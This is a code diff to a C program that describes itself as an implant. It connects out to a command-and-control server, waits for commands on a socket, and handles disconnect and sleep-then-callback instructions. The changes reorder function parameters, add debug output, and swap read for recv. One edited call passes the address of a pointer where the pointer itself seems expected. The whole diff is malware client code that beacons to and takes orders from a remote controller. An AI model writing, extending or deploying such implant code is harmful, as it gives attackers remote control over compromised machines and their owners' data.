@@ -13,7 +13,7 @@
 
 
 // Callout and establish connection to C2
-int callout(uint16_t port, const char* ip_address, int* client_fd)
+int callout( int* client_fd, const char* ip_address, uint16_t port)
 {
     int status = 1;
     struct sockaddr_in address;
@@ -61,22 +61,26 @@ cleanup:
 int handleCommands(int* client_fd)
 {
     int status = 1;
-    ssize_t valread = 0;
     bool exit = false;
     
     while (!exit)
     {
         char buffer [1024] = { 0 };
-        Command* command;
+        ssize_t valread = 0;
+        Command* command = NULL;
+
+        printf("Waiting for C2 command...\n\n");
 
         // Read our command
-        valread = read(*client_fd, buffer, sizeof(buffer)-1);
-        if (valread <= 0)
+        valread = recv(*client_fd, buffer, sizeof(buffer)-1, 0);
+        if (valread < 0)
         {
-            printf("Failed to read from socket\n");
+            printf("Failed read, error 0x%X (%s)\n", errno, strerror(errno));
             status = 0;
             goto cleanup;
         }
+
+        printf("Read %i bytes from socket\n", valread);
 
         // Parse our bytes to see what command we're dealing with 
         command = (Command*)buffer;
@@ -85,9 +89,7 @@ int handleCommands(int* client_fd)
         {
             case disconnect:
                 printf("Received disconnect command!\n");  
-                //printf("Value for disconnect: 0x%X\n", command->disconnectcommand.sleep);
-                //printf("Value for callback port: 0x%X\n", command->disconnectcommand.callbackport);
-                
+
                 // If the C2 says no sleep then we just exit
                 if (command->disconnectcommand.sleep == 0)
                 {
@@ -105,7 +107,7 @@ int handleCommands(int* client_fd)
                 {
                     printf("Putting implant to sleep for %i seconds; callback port is on %i\n", (command->disconnectcommand.sleep/1000), command->disconnectcommand.callbackport);
 
-                    if (!handleDisconnectSleep(client_fd, command->disconnectcommand.sleep, command->disconnectcommand.callbackport))
+                    if (!handleDisconnectSleep(&client_fd, command->disconnectcommand.sleep, command->disconnectcommand.callbackport))
                     {
                         printf("Failed to handle disconnect and reconnect!\n");
                         exit = true;
@@ -146,7 +148,7 @@ int main()
 
     printf("Establishing connection to C2...\n");
 
-    if (!callout(port, ip_address, &client_fd))
+    if (!callout(&client_fd, ip_address, port))
     {
         printf("Failed our callout to C2\n");
         return 0;
